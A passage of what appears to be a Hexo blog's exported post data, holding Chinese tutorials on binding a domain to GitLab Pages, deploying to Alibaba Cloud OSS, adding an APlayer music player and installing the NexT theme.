        <category>个人网页搭建</category>
      </categories>
      <tags>
        <tag>个人网页</tag>
        <tag>Hexo</tag>
        <tag>Gitlab Pages</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建个人网页（五）—— 域名绑定</title>
    <url>/2024/12/13/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%A1%B5%EF%BC%88%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>虽然我们有了网站，但如果没有域名，想要访问网站可能得访问类似<a href="">jinqq.gitlab.io</a>的地址（如果布在服务器的话更是一串ip地址），在别人看来这一点也不像个人网站的地址。</p>
<p>在本章博客中，我会讲如何在阿里云购买域名，以及如何将其绑定到前面我们Gitlab Pages部署的网站上，后续可能会讲其他方案。</p>
<h3 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h3><p>首先进入阿里云域名页面：<a href="https://wanwang.aliyun.com/domain/tld#.com">域名_域名查询_域名注册_.com_.cn-阿里云</a>。</p>
<p>输入你想购买的域名，立即查询。</p>
<span id="more"></span>

<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241213120525635.png" alt="image-20241213120525635"></p>
<p>选择一个你想购买的域名后缀，一般.com的最贵，其他差不多，然后选择年限，首次购买应该有优惠。</p>
<p>购买成功后，进入域名控制台。会提示让你创建信息模板，按照提示操作。并且完成之后的实名认证。</p>
<p>到这里你就拥有了域名。</p>
<h3 id="域名绑定Gitlab-Pages"><a href="#域名绑定Gitlab-Pages" class="headerlink" title="域名绑定Gitlab Pages"></a>域名绑定Gitlab Pages</h3><p>首先进入Gitlab项目中，点击左侧“部署&#x2F;Pages”。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/c7425f9eee1747b338ec16e4b703cafd.png" alt="c7425f9eee1747b338ec16e4b703cafd"></p>
<p>点击“新域名”。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/a14447734d0c2af12dfb0631477cc120.png" alt="a14447734d0c2af12dfb0631477cc120"></p>
<p>填写你注册的域名（例如jinqiqing.cn)，然后创建。可以看到下面这个页面（不过此时状态应该还是未验证），先勾选“使用Let’s Encrypt自动管理证书”。<br><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/85030a988e4281f932234dde57a0ded3.png" alt="85030a988e4281f932234dde57a0ded3"></p>
<p>然后回到阿里云域名控制台，点击解析我们的域名。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/867710b9c3e9fb80c85c2eff0697d3d6.png" alt="867710b9c3e9fb80c85c2eff0697d3d6"></p>
<p>点击添加记录。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/a5b7a7fdf2b83dfed19d35835c9a1d5e.png" alt="a5b7a7fdf2b83dfed19d35835c9a1d5e"></p>
<p>在这里我们要添加2条记录，并且会用到前面Gitlab上Pages域名里的值。</p>
<p>第一条，记录类型-CNAME，主机记录-@，解析请求来源-默认，记录值填刚刚gitlab pages里DNS一栏里ALIAS后面的值（例如jinqq.gitlab.io.），TTL填默认的-10，然后确定。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241213123213863.png" alt="image-20241213123213863"></p>
<p>然后创建第二条，记录类型-TXT，主机记录填验证那一栏中TXT前面的值（xxxx.jinqiqing.cn中的xxxx），解析请求来源-默认，记录值填&#x3D;号后面的值，TTL填默认的-10，然后确定。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/b69342fef12e9853ac39f1f1e528f4b5.png" alt="b69342fef12e9853ac39f1f1e528f4b5"></p>
<p>创建完成会回到刚刚的gitlab pages域名界面，点击验证，看是否成功。如果成功了，那么你就能通过你购买的域名访问你的网站了！</p>
<p>不过这里只绑定了jinqiqing.cn的，还没有绑定<a href="http://www.jinqiqing.cn/">www.jinqiqing.cn</a> 的，同样的操作，在gitlab和阿里云域名控制台重复一次，只不过换成www即可，不赘述了。</p>
<h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3><p>其实到这里为止，我们的网站所有流程已经搭建完成了！</p>
<p>基本的主流程为三步：<strong>Hexo搭建静态网页 -&gt; Gitlab Pages构建和部署网站 -&gt; 阿里云域名绑定网站</strong></p>
<p>同时，为了优化我们的网站，我们使用了<strong>Hexo-NexT主题</strong>进行美化。为了我们的博客能插入图片，我们使用<strong>阿里云OSS</strong>充当图床。</p>
<p>接下来，我可能会讲如何使用其他方式（例如服务器）来部署网站，使得我们网站的访问效率更快！</p>
]]></content>
      <categories>
        <category>个人网页搭建</category>
      </categories>
      <tags>
        <tag>个人网页</tag>
        <tag>Gitlab Pages</tag>
        <tag>阿里云</tag>
        <tag>域名</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建个人网页（六）—— 阿里云OSS部署</title>
    <url>/2024/12/13/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%A1%B5%EF%BC%88%E5%85%AD%EF%BC%89%E2%80%94%E2%80%94%E9%98%BF%E9%87%8C%E4%BA%91OSS%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>前面我们是用Gitlab Pages来托管我们的页面的，但是其也有一些缺点，比如网页访问速度慢，因此我们选择寻找其他替代方案，本章介绍用阿里云OSS来托管静态页面的方法。<strong>此外强烈建议，先看完全文再上手操作。</strong></p>
<h3 id="一-Github-Pages、Gitlab-Pages、服务器、OSS比较"><a href="#一-Github-Pages、Gitlab-Pages、服务器、OSS比较" class="headerlink" title="一 Github Pages、Gitlab Pages、服务器、OSS比较"></a>一 Github Pages、Gitlab Pages、服务器、OSS比较</h3><h4 id="1-Github-Pages"><a href="#1-Github-Pages" class="headerlink" title="1. Github Pages"></a>1. Github Pages</h4><p><strong>优点</strong>：完全免费（除域名外）；部署简单快捷；</p>
<p><strong>缺点</strong>：国内访问加载非常缓慢，不挂梯子基本访问不了；</p>
<h4 id="2-Gitlab-Pages"><a href="#2-Gitlab-Pages" class="headerlink" title="2. Gitlab Pages"></a>2. Gitlab Pages</h4><p><strong>优点</strong>：完全免费（除域名外）；部署简单快捷；访问速度比github好很多，基本不需要梯子；</p>
<p><strong>缺点</strong>：相比github，每次deploy后要额外在仓库传一个.gitlab-ci.yml流水线配置文件；</p>
<p>**备注：**nju也有个gitlab代码托管服务，但貌似无法托管静态网页（没有gitlab pages功能），只能当作一个仓库用。</p>
<h4 id="3-服务器"><a href="#3-服务器" class="headerlink" title="3. 服务器"></a>3. 服务器</h4><p><strong>优点</strong>：访问速度快；</p>
<p><strong>缺点</strong>：国内服务器要备案域名；部署较麻烦；付费；</p>
<h4 id="4-OSS（对象存储服务）"><a href="#4-OSS（对象存储服务）" class="headerlink" title="4. OSS（对象存储服务）"></a>4. OSS（对象存储服务）</h4><p><strong>优点</strong>：访问速度快；部署简单快捷；可以利用我们前面图床使用的oss；</p>
<p><strong>缺点</strong>：同样需要备案域名；付费；</p>
<span id="more"></span>

<h3 id="二-阿里云OSS部署hexo"><a href="#二-阿里云OSS部署hexo" class="headerlink" title="二 阿里云OSS部署hexo"></a>二 阿里云OSS部署hexo</h3><p>为什么会想到用oss呢？这还是在oss控制台看到的提示：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241213175527161.png" alt="image-20241213175527161"></p>
<p>然后上网找了找教程，果然有：<a href="https://blog.csdn.net/huzhanfei/article/details/114199556">Hexo一键部署到阿里云OSS并设置浏览器缓存_oss cache-control-CSDN博客</a>，于是尝试按照他的教程来。</p>
<h4 id="1-阿里云OSS配置"><a href="#1-阿里云OSS配置" class="headerlink" title="1. 阿里云OSS配置"></a>1. 阿里云OSS配置</h4><p>打开阿里云控制台，选择我们的bucket（购买oss和创建bucket参照第二章），点击左侧静态页面，安装如下配置：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241213150036665.png" alt="image-20241213150036665"></p>
<p>然后跟第二章一样创建一个用户（RAM控制台中），<strong>记住这里的ID和Secret，这个页面关闭就没有了！</strong></p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241213150502524.png" alt="image-20241213150502524"></p>
<p>添加用户权限，勾选AliyunOSSFullAccess，确认。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241213150449069.png" alt="image-20241213150449069"></p>
<h4 id="2-Hexo配置"><a href="#2-Hexo配置" class="headerlink" title="2. Hexo配置"></a>2. Hexo配置</h4><p>然后回到我们的hexo的blog目录，执行下面命令安装所需组件：</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">npm <span class="keyword">install</span> hexo-deployer-ali-oss-extend</span><br></pre></td></tr></table></figure>

<p>打开hexo配置文件_config.yml，按照如下配置，然后保存：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">type:</span> <span class="string">ali-oss</span></span><br><span class="line">  <span class="attr">region:</span> <span class="string">oss-cn-nanjing</span></span><br><span class="line">  <span class="attr">accessKeyId:</span> <span class="string">&lt;您的oss</span>  <span class="string">accessKeyId&gt;</span></span><br><span class="line">  <span class="attr">accessKeySecret:</span> <span class="string">&lt;您的oss</span> <span class="string">accessKeySecret&gt;</span></span><br><span class="line">  <span class="attr">bucket:</span> <span class="string">&lt;您的bucket名&gt;</span> </span><br><span class="line">  <span class="attr">cacheControl:</span></span><br><span class="line">    <span class="attr">images:</span> <span class="string">public,</span> <span class="string">max-age=31536000</span>  </span><br><span class="line">    <span class="attr">css:</span> <span class="string">public,</span> <span class="string">max-age=604800</span>     </span><br><span class="line">    <span class="attr">js:</span> <span class="string">public,</span> <span class="string">max-age=86400</span>        </span><br><span class="line">    <span class="attr">html:</span> <span class="string">public,</span> <span class="string">max-age=86400</span>     </span><br><span class="line">    <span class="attr">other:</span> <span class="literal">no</span><span class="string">-cache</span></span><br></pre></td></tr></table></figure>

<p>到这里，执行我们的hexo三件套命令测试是否部署成功：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo <span class="selector-tag">g</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>成功后，可以通过bucket的默认域名访问，但会发现会下载文件，而不是在浏览器中浏览网站，具体原因：<a href="https://help.aliyun.com/zh/oss/user-guide/map-custom-domain-names-5?spm=a2c4g.11186623.0.0.79821a40xGOBD6#concept-rz2-xg5-tdb">绑定自定义域名至Bucket默认域名实现预览文件_对象存储(OSS)-阿里云帮助中心</a>。</p>
<p>因此我们要绑定域名到该bucket上，这需要我们完成实名认证，同时<strong>备案域名（这个比较麻烦）</strong>。</p>
<h4 id="3-域名备案"><a href="#3-域名备案" class="headerlink" title="3. 域名备案"></a>3. 域名备案</h4><p>如果想要备案域名，<strong>阿里云要求我们至少有一个支持备案的云服务器（并且至少还有3个月，且不是按量计费的，因此我们甚至不能使用阿里云送的消费券）</strong>，具体请查看：<a href="https://help.aliyun.com/zh/icp-filing/basic-icp-service/user-guide/icp-filing-server-access-information-check?spm=5176.beian-pc.0.0.189479feapi10H#title-lrm-lpc-nkk">ICP备案前的服务器及接入信息确认排查_备案(ICP Filing)-阿里云帮助中心</a>。</p>
<p>但阿里云貌似有个活动，99元买ECS2核2G一年，就买这个最便宜的吧。（我既然都买ECS了，干嘛不直接部署在ECS上呢？）</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241213160234602.png" alt="image-20241213160234602" style="zoom:50%;" />

<p>购买成功后，可以看到我们有了一个云服务器实例：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241213172244144.png" alt="image-20241213172244144" style="zoom:50%;" />

<p>此时我们就满足了备案域名的前置条件——拥有一个云服务器。然后我们找到阿里云首页，点击右上角备案。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241213172345402.png" alt="image-20241213172345402"></p>
<p>接下来按照提示操作即可，有一个地方比较麻烦，要打印承诺书签字上传，还要拍视频。哎，下楼去打印店了。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/0aacaaf09d926b8696cf8f0fe05a08be.png" alt="0aacaaf09d926b8696cf8f0fe05a08be" style="zoom:67%;" />

<p>完成之后，剩下就是等待审核通过，大约需要十天。</p>
<h4 id="4-域名绑定"><a href="#4-域名绑定" class="headerlink" title="4. 域名绑定"></a>4. 域名绑定</h4><h3 id="继续"><a href="#继续" class="headerlink" title="继续"></a>继续</h3>]]></content>
      <categories>
        <category>个人网页搭建</category>
      </categories>
      <tags>
        <tag>个人网页</tag>
        <tag>oss</tag>
        <tag>阿里云</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建个人网页（八）—— 音乐播放器</title>
    <url>/2024/12/16/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%A1%B5%EF%BC%88%E5%85%AB%EF%BC%89%E2%80%94%E2%80%94%E9%9F%B3%E4%B9%90%E6%92%AD%E6%94%BE%E5%99%A8/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>本章主要讲如何为网站增加音乐播放器。</p>
<h3 id="Aplayer音乐播放器"><a href="#Aplayer音乐播放器" class="headerlink" title="Aplayer音乐播放器"></a>Aplayer音乐播放器</h3><p>音乐播放器我选择的是Aplayer插件，能够自定义歌曲列表，并定义播放设置等。</p>
<p>首先，安装aplyer，在blog&#x2F;目录下：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">npm install aplayer <span class="comment">--save</span></span><br></pre></td></tr></table></figure>

<p>然后将<em>blog&#x2F;node_modules&#x2F;aplayer&#x2F;dist</em>目录复制到<em>blog&#x2F;themes&#x2F;next&#x2F;source</em>下。</p>
<p>在目录 <em>blog&#x2F;themes&#x2F;next&#x2F;source&#x2F;dist</em> 下新建 <code>music.js</code> 文件，该文件将定义播放器的设置和播放列表，以下是一个示例：</p>
<span id="more"></span>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ap = <span class="keyword">new</span> <span class="title class_">APlayer</span>(&#123;</span><br><span class="line">    <span class="attr">container</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;aplayer&#x27;</span>),</span><br><span class="line">    <span class="comment">// fixed: true,</span></span><br><span class="line">    <span class="comment">// autoplay: true,</span></span><br><span class="line">    <span class="attr">audio</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;晴天&#x27;</span>,</span><br><span class="line">        <span class="attr">artist</span>: <span class="string">&#x27;周杰伦&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/images/周杰伦 - 晴天.mp3&#x27;</span>,</span><br><span class="line">        <span class="attr">cover</span>: <span class="string">&#x27;/images/晴天.png&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;我记得&#x27;</span>,</span><br><span class="line">        <span class="attr">artist</span>: <span class="string">&#x27;赵雷&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/images/赵雷 - 我记得.flac&#x27;</span>,</span><br><span class="line">        <span class="attr">cover</span>: <span class="string">&#x27;/images/我记得.png&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>然后是选择将音乐播放器插入的位置，我放到了侧边栏的底下，比较美观一点。打开blog&#x2F;themes&#x2F;next&#x2F;layout&#x2F;_macro&#x2F;sidebar.njk 文件，找到<code>&lt;div class=&quot;sidebar-panel-container&quot;&gt;</code>和<code>&lt;div class=&quot;back-to-top animated&quot;...&gt;</code>，在这两个元素中间插入以下内容：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&lt;link <span class="attribute">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attribute">href</span>=<span class="string">&quot;/dist/APlayer.min.css&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="attribute">id</span>=<span class="string">&quot;aplayer&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script <span class="attribute">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attribute">src</span>=<span class="string">&quot;/dist/APlayer.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script <span class="attribute">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attribute">src</span>=<span class="string">&quot;/dist/music.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>插入的位置如下图所示：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/4bb31b4573b2c8193d05752c93fdda36.png" alt="4bb31b4573b2c8193d05752c93fdda36" style="zoom: 50%;" />

<p>到此就算完成了，可以用hexo clean&#x2F;g&#x2F;s命令三件套查看效果。</p>
<h3 id="引入歌曲"><a href="#引入歌曲" class="headerlink" title="引入歌曲"></a>引入歌曲</h3><p>定义播放器的设置和播放列表都在<code>music.js</code>文件中，引入歌曲有两种方式，外部链接或内部链接，示例如下：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    name<span class="punctuation">:</span> &#x27;晴天&#x27;<span class="punctuation">,</span></span><br><span class="line">    artist<span class="punctuation">:</span> &#x27;周杰伦&#x27;<span class="punctuation">,</span></span><br><span class="line">    url<span class="punctuation">:</span> &#x27;/images/周杰伦 - 晴天.mp3&#x27;<span class="punctuation">,</span></span><br><span class="line">    cover<span class="punctuation">:</span> &#x27;/images/晴天.png&#x27;<span class="punctuation">,</span></span><br><span class="line">&#125;<span class="punctuation">,</span></span><br><span class="line">&#123;</span><br><span class="line">    name<span class="punctuation">:</span> &#x27;スパークル（火花）——《你的名字。》插曲&#x27;<span class="punctuation">,</span></span><br><span class="line">    artist<span class="punctuation">:</span> &#x27;ゆう十&#x27;<span class="punctuation">,</span></span><br><span class="line">    url<span class="punctuation">:</span> &#x27;http://music.163.com/song/media/outer/url?id=<span class="number">1984045303</span>.mp3&#x27;<span class="punctuation">,</span></span><br><span class="line">    cover<span class="punctuation">:</span> &#x27;http://p2.music.126.net/SiTInUUumsPdSdndv1MCyw==/<span class="number">10995116790388</span><span class="number">8878</span>.jpg?param=130y130&#x27;<span class="punctuation">,</span></span><br><span class="line">&#125;<span class="punctuation">,</span></span><br><span class="line">&#123;</span><br><span class="line">    name<span class="punctuation">:</span> &#x27;Call of Silence&#x27;<span class="punctuation">,</span></span><br><span class="line">    artist<span class="punctuation">:</span> &#x27;澤野弘之 (さわの ひろゆき)&#x27;<span class="punctuation">,</span></span><br><span class="line">    url<span class="punctuation">:</span> &#x27;https://xxxxx-bucket.oss-cn-nanjing.aliyuncs.com/music/call%20of%20silence.mp3&#x27;<span class="punctuation">,</span></span><br><span class="line">    cover<span class="punctuation">:</span> &#x27;https://xxxxx-bucket.oss-cn-nanjing.aliyuncs.com/music/call%20of%20silence.png&#x27;<span class="punctuation">,</span></span><br><span class="line">&#125;<span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>如果使用内部链接，只需要先下载歌曲，然后在<code>blog/source/images</code>目录中上传对应的歌曲和封面文件即可。</p>
<p>关于下载歌曲，网易云很多歌曲都没有版权；qq音乐下载的话，如果是非vip歌曲，下载的会是<code>flac</code>文件，经测试是可以正常播放的；如果是vip歌曲，下载下来会是<code>mgg</code>文件，我没试过能否正常播放。</p>
<blockquote>
<p>qq音乐下载说明：</p>
<ol>
<li><p>应版权方要求，此类歌曲会员用户下载后为专属格式，拷贝至其他播放器可能无法播放。</p>
</li>
<li><p>若需拷贝至其他播放器播放，可单曲购买该歌曲后重新下载，即可拷贝至其他播放器播放。</p>
</li>
</ol>
<p>这里放个免费下mp3歌曲和lrc歌词的网站：<a href="https://www.gequbao.com/">歌曲宝-找歌就用歌曲宝-MP3音乐高品质在线免费下载</a></p>
</blockquote>
<p>使用外部链接的话，可以用网易云的外链播放器，复制其中的src即可，但是有很多歌曲有版权保护，无法生成。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/982bf51ce83dff83f3a644e6e5a99267.png" alt="982bf51ce83dff83f3a644e6e5a99267" style="zoom:50%;" />

<p>还有一个办法，就是使用我们前面提到的阿里云OSS，然后将歌曲和封面上传到bucket中（上传文件不建议有中文，不然链接会很丑），然后复制链接填入<code>music.js</code>，亲测有效。这样还能控制静态网页代码的大小。<strong>（推荐）</strong></p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241216120854017.png" alt="image-20241216120854017" style="zoom: 50%;" />



<h3 id="Aplayer设置"><a href="#Aplayer设置" class="headerlink" title="Aplayer设置"></a>Aplayer设置</h3><p>此外还有一些Aplayer的设置，这些都在<code>music.js</code>文件中填写：</p>
<ol>
<li><p>fixed: true；使用后音乐播放器会固定出现在<strong>aplayer所在元素的左下角</strong>，因此如果要开启，请将aplayer元素放在整个网页之中（否则不美观），例如在<code>blog/themes/next/layout/_layout.njk</code>文件的最后一个<code>&lt;body&gt;</code>前面插入，效果如下：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241216121156539.png" alt="image-20241216121156539" style="zoom:50%;" />

<p>此时可能导致back2top按钮被播放器遮挡，解决：进入<code>blog\themes\next\source\css\_common\components\back-to-top.styl</code>文件，给  &amp;.back-to-top-on 添加一个播放器高度的值，例如：</p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">&amp;.back-to-<span class="literal">top</span>-<span class="literal">on</span> &#123;</span><br><span class="line">    <span class="literal">bottom</span>: <span class="variable">$b2t</span>-position-<span class="literal">bottom</span>-<span class="literal">on</span> + <span class="number">50</span>px<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>autoplay: true；开启后会自动播放音乐，但是大部分浏览器都禁止了自动播放，所以开了也没用。</p>
</li>
<li><p>order: ‘list’&#x2F;‘random’；列表顺序播放与随机播放。</p>
</li>
</ol>
<p>更多其他设置参考官网<a href="https://aplayer.js.org/#/home">Home - APlayer</a>。</p>
<h3 id="解决切换页面播放中断问题"><a href="#解决切换页面播放中断问题" class="headerlink" title="解决切换页面播放中断问题"></a>解决切换页面播放中断问题</h3><p>参考：<a href="https://hxwguang.github.io/post/Hexo-Next%E4%B8%BB%E9%A2%98%E4%B8%AD%E6%B7%BB%E5%8A%A0aplayer%E6%92%AD%E6%94%BE%E5%99%A8/">Hexo Next主题中添加aplayer播放器 | 南风</a></p>
<p>如果你切回页面，会发现歌曲播放中断，并且也丢失了进度。好在现在的Next主题里已经集成了pjax插件，利用它就可以解决问题，这个插件主要功能是加速页面的切换速度，建议启用！</p>
<p>在<code>~/themes/next/</code>目录下右键<code>git bash here</code>，输入命令：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/theme-next/</span>theme-<span class="keyword">next</span>-pjax source<span class="regexp">/lib/</span>pjax</span><br></pre></td></tr></table></figure>

<p>下载完成后打开主题配置文件<code>_config.next.yml</code>文件，定位到<code>pjax</code>处，启用就可以了：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pjax:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="开启歌词"><a href="#开启歌词" class="headerlink" title="开启歌词"></a>开启歌词</h3><p>aplayer支持三种方法引进歌词，分别为lrc、js、html，这里介绍lrc方法。</p>
<p>在<code>music.js</code>文件中，按如下改写即可：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> ap = <span class="keyword">new</span> <span class="title class_">APlayer</span>(&#123;</span><br><span class="line">    <span class="attr">container</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;aplayer&#x27;</span>),</span><br><span class="line">    <span class="attr">lrcType</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">audio</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;name&#x27;</span>,</span><br><span class="line">        <span class="attr">artist</span>: <span class="string">&#x27;artist&#x27;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;demo.mp3&#x27;</span>,</span><br><span class="line">        <span class="attr">cover</span>: <span class="string">&#x27;demo.jpg&#x27;</span>,</span><br><span class="line">        <span class="attr">lrc</span>: <span class="string">&#x27;lrc.lrc&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>其中lrc应该满足以下格式之一：</p>
<figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line"><span class="comment">[mm:ss]</span>APlayer</span><br><span class="line"><span class="comment">[mm:ss.xx]</span><span class="keyword">is</span></span><br><span class="line"><span class="comment">[mm:ss.xxx]</span>amazing</span><br><span class="line"><span class="comment">[mm:ss.xx]</span><span class="comment">[mm:ss.xx]</span>APlayer</span><br><span class="line"><span class="comment">[mm:ss.xx]</span>&lt;mm:ss.xx&gt;<span class="keyword">is</span></span><br><span class="line"><span class="comment">[mm:ss.xx]</span>amazing<span class="comment">[mm:ss.xx]</span>APlayer</span><br></pre></td></tr></table></figure>

<p>注意：有些lrc文件的时间戳可能类似于[12:03.2]或者[32:43.250158]，**这种都是aplayer不支持的，会导致这行歌词被跳过，**请手动进行修改。</p>
<h3 id="解决CORS跨域问题"><a href="#解决CORS跨域问题" class="headerlink" title="解决CORS跨域问题"></a>解决CORS跨域问题</h3><p>对于lrc歌词，如果使用外部链接的方法，有可能发现无法加载，检查控制台报错显示：</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/ef8253878ce39340cb44e90709873bc5.png" alt="ef8253878ce39340cb44e90709873bc5"></p>
<p>这是CORS跨域问题，猜测可能的原因是lrc文件的Header Type为application&#x2F;octet-stream，而mp3和png的Header Type在阿里云OSS里默认允许跨域。</p>
<p>解决：在oss控制台，进入bucket，左侧点击 ”数据安全&#x2F;跨域设置“，创建规则，按下图填写，然后确定。</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/0afc5bc5a42262eae9fade41b878cf4b.png" alt="0afc5bc5a42262eae9fade41b878cf4b" style="zoom:50%;" />

<h3 id="播放器美化"><a href="#播放器美化" class="headerlink" title="播放器美化"></a>播放器美化</h3><p>参考：<a href="https://81.70.24.154/article/aplayer">Aplayer 音乐播放器美化配置 | Dale 的花园 ^_^</a></p>
]]></content>
      <categories>
        <category>个人网页搭建</category>
      </categories>
      <tags>
        <tag>个人网页</tag>
        <tag>Aplayer</tag>
        <tag>音乐播放器</tag>
      </tags>
  </entry>
  <entry>
    <title>如何搭建个人网页（四）—— Hexo-Next主题</title>
    <url>/2024/12/13/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%A1%B5%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94Hexo-Next%E4%B8%BB%E9%A2%98/</url>
    <content><![CDATA[<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>在第二章中，我们已经可以构建一个简单的网站，但用的是hexo的默认主题，并不是特别美观，同时扩展性也不强。本章会讲解如何通过Hexo-Next（一个hexo主题），来美化和丰富我们的网站。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><blockquote>
<p>Hexo NexT 是 Hexo 框架下的一款极具人气的博客主题，以其 <strong>简约优雅的设计</strong> 和 <strong>强大的自定义功能</strong> 著称。NexT 提供了丰富的主题风格、响应式设计、模块化功能支持（如评论系统、搜索、社交图标等），并兼容各种插件和第三方服务。同时，它的配置简单直观，适合从技术新手到进阶用户使用，是追求高效与美观的博客创作者的理想选择。</p>
</blockquote>
<p>hexo next有npm和git两种安装方法，前者比较简单（但是要求hexo 5.0以上版本），这里只介绍前者。</p>
<p>首先进入hexo根目录blog中，然后npm安装。</p>
<span id="more"></span>

<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">cd <span class="keyword">blog</span></span><br><span class="line"><span class="keyword"></span>npm <span class="keyword">install </span>hexo-theme-next</span><br></pre></td></tr></table></figure>

<p>然后为了配置方便，将next配置文件放到根目录下：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cp</span> node_modules/hexo-theme-<span class="keyword">next</span>/_config.yml _config.<span class="keyword">next</span>.yml</span><br></pre></td></tr></table></figure>

<p>这种情况下，_config.next.yml和原来hexo的_config.yml两个配置文件就都在根目录下了，这两个文件很关键。为了区分，我们把_config.yml叫做<strong>hexo站点配置文件</strong>，把_config.next.yml称为<strong>next主题配置文件</strong>。</p>
<p>在hexo配置文件中，我们将theme改为next：</p>
